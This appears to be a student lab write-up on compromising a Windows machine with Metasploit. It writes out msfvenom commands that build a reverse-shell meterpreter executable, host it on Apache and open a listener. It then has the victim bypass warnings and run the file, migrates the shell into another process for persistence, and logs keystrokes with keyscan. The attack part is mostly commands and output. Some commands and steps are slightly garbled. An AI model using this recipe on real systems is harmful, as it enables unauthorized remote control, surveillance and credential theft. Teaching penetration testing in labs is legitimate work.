# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## ALGORITHM:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

# commands:
```
ipconfig
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
cp fun.exe /var/www/html
sudo systemctl apache2 start
msfconsole
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
ps
```
# EXECUTION STEPS AND ITS OUTPUT:
Find the attacker ip address using ipconfig

# OUTPUT:
![image](https://github.com/karthika28112004/Compromising-windows-using-Metasploit/assets/128035087/c329f5e0-1026-49bb-a460-c33cd337f80b)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

# OUTPUT:
![image](https://github.com/karthika28112004/Compromising-windows-using-Metasploit/assets/128035087/7380210c-4ea5-4bc9-9760-e73134a676eb)

copy the fun.exe into the apache /var/www/html folder

# OUTPUT:
![image](https://github.com/karthika28112004/Compromising-windows-using-Metasploit/assets/128035087/c08cc1ac-7f33-4728-a0cc-3fabe2c0260e)

Check the status of apache2

# OUTPUT:
![image](https://github.com/karthika28112004/Compromising-windows-using-Metasploit/assets/128035087/6ab1f556-509b-44bb-aa5b-ea25d084f479)

Invoke msfconsole:

# OUTPUT:

![image](https://github.com/karthika28112004/Compromising-windows-using-Metasploit/assets/128035087/7bac94f8-c819-48f3-80b8-0ba5f4760c2d)

ype help or a question mark "?" to see the list of all available commands you can use inside msfconsole
![image](https://github.com/karthika28112004/Compromising-windows-using-Metasploit/assets/128035087/1dc91b9e-4ee2-4ea0-8793-61c2e6674bcc)

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![image](https://github.com/karthika28112004/Compromising-windows-using-Metasploit/assets/128035087/91ee5b80-7ead-4074-b94d-e57d406b63eb)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![image](https://github.com/karthika28112004/Compromising-windows-using-Metasploit/assets/128035087/f15c5ecb-1ab4-48b9-b6eb-4aa07d4ca0aa)

Bypass any warning boxes, double-click the file, and allow it to run.
![image](https://github.com/karthika28112004/Compromising-windows-using-Metasploit/assets/128035087/3502424c-9809-4517-871f-331bc774a103)

On kali give the command exploit
![image](https://github.com/karthika28112004/Compromising-windows-using-Metasploit/assets/128035087/74d68931-80c5-47da-b5aa-d0109a6252ee)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
![image](https://github.com/karthika28112004/Compromising-windows-using-Metasploit/assets/128035087/56f7754c-1a12-464c-8a2a-7f74d0df12e2)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command: migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
![image](https://github.com/karthika28112004/Compromising-windows-using-Metasploit/assets/128035087/64c1827f-4651-4ada-9603-9a5b0791644c)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![image](https://github.com/karthika28112004/Compromising-windows-using-Metasploit/assets/128035087/a9e49039-ffe6-4b5d-b621-af6b93a041b6)

![image](https://github.com/karthika28112004/Compromising-windows-using-Metasploit/assets/128035087/f4532000-3ed8-4d6a-816a-4c5b5fca3432)

keyscan_dump Shows the keystrokes captured so far
![image](https://github.com/karthika28112004/Compromising-windows-using-Metasploit/assets/128035087/e72df207-717a-420c-ae86-7dc73f628827)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
